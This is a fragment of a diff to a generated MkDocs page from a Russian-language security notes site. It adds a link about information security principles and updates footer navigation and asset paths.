+</ul>
+<p>Дополнительно можно почитать про <a href="https://ivanovds.ru/CyberSec/SecurityPrinciples/">"Принципы обеспечения информационной безопасности"</a>, в частности раздел про ISO/IEC 19249:2017</p>
 
 
   
@@ -3399,7 +3933,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Нижний колонтитул" >
         
           
-          <a href="../Linux/Linux_commands/" class="md-footer__link md-footer__link--prev" aria-label="Назад: Команды Linux">
+          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="Назад: Active Directory">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
@@ -3409,20 +3943,20 @@
                 Назад
               </span>
               <div class="md-ellipsis">
-                Команды Linux
+                Active Directory
               </div>
             </div>
           </a>
         
         
           
-          <a href="Active_Directory/" class="md-footer__link md-footer__link--next" aria-label="Вперед: Active Directory">
+          <a href="../../Alternate_Data_Streams/" class="md-footer__link md-footer__link--next" aria-label="Вперед: Alternate Data Streams">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Вперед
               </span>
               <div class="md-ellipsis">
-                Active Directory
+                Alternate Data Streams
               </div>
             </div>
             <div class="md-footer__button md-icon">
@@ -3475,10 +4009,10 @@
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["announce.dismiss", "content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tooltips", "navigation.footer", "navigation.indexes", "navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../assets/javascripts/workers/search.a264c092.min.js", "translations": {"clipboard.copied": "\u0421\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u043e \u0432 \u0431\u0443\u0444\u0435\u0440", "clipboard.copy": "\u041a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0432 \u0431\u0443\u0444\u0435\u0440", "search.result.more.one": "\u0415\u0449\u0451 1 \u043d\u0430 \u044d\u0442\u043e\u0439 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435", "search.result.more.other": "\u0415\u0449\u0451 # \u043d\u0430 \u044d\u0442\u043e\u0439 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435", "search.result.none": "\u0421\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e", "search.result.one": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e 1 \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0435", "search.result.other": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439: #", "search.result.placeholder": "\u041d\u0430\u0447\u043d\u0438\u0442\u0435 \u043f\u0435\u0447\u0430\u0442\u0430\u0442\u044c \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430", "search.result.term.missing": "\u041e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442", "select.version": "\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0432\u0435\u0440\u0441\u0438\u044e"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["announce.dismiss", "content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tooltips", "navigation.footer", "navigation.indexes", "navigation.instant", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.a264c092.min.js", "translations": {"clipboard.copied": "\u0421\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u043e \u0432 \u0431\u0443\u0444\u0435\u0440", "clipboard.copy": "\u041a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0432 \u0431\u0443\u0444\u0435\u0440", "search.result.more.one": "\u0415\u0449\u0451 1 \u043d\u0430 \u044d\u0442\u043e\u0439 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435", "search.result.more.other": "\u0415\u0449\u0451 # \u043d\u0430 \u044d\u0442\u043e\u0439 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0435", "search.result.none": "\u0421\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e", "search.result.one": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e 1 \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0435", "search.result.other": "\u041d\u0430\u0439\u0434\u0435\u043d\u043e \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0439: #", "search.result.placeholder": "\u041d\u0430\u0447\u043d\u0438\u0442\u0435 \u043f\u0435\u0447\u0430\u0442\u0430\u0442\u044c \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430", "search.result.term.missing": "\u041e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442", "select.version": "\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0432\u0435\u0440\u0441\u0438\u044e"}}</script>
     
     
-      <script src="../assets/javascripts/bundle.726fbb30.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.726fbb30.min.js"></script>
       
     
   </body>
